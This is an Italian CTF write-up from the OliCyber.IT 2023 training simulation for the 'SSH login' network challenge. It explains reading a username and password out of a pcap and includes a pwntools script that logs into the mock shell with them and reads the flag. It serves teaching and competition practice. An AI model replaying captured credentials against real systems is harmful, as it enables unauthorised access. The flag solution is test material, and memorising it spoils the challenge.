# OliCyber.IT 2023 - Simulazione training camp 2

## [network] SSH login (207 risoluzioni)

La challenge è una shell SSH fittizia. Viene allegato un pcap contenente un login.

### Soluzione

Nel pcap si legge facilmente l'username e la password di login.
Si può quindi collegarsi, analizzare il file system e trovare la flag come se fosse una vera shell.

### Exploit

```python
#!/bin/python3

import os
from pwn import *
import logging
logging.disable()

HOST = os.environ.get("HOST", "127.0.0.1")
PORT = int(os.environ.get("PORT", 34000))

conn = remote(HOST, PORT)
conn.sendline(b"gabibbo")
conn.sendline(b"p4ssw0rd_SSH_s3gr3t4")
conn.sendline(b"cd Desktop")
conn.sendline(b"cd olicyber")
conn.sendline(b"cd 2022")
conn.sendline(b"cd Olicyber_git_repository_2022")
conn.sendline(b"cd network_brutta")
conn.sendline(b"cat flag.txt")
data = conn.recvuntil(b"}").decode()
flag = "flag{"+data.split("flag{")[-1]

print(flag)
```
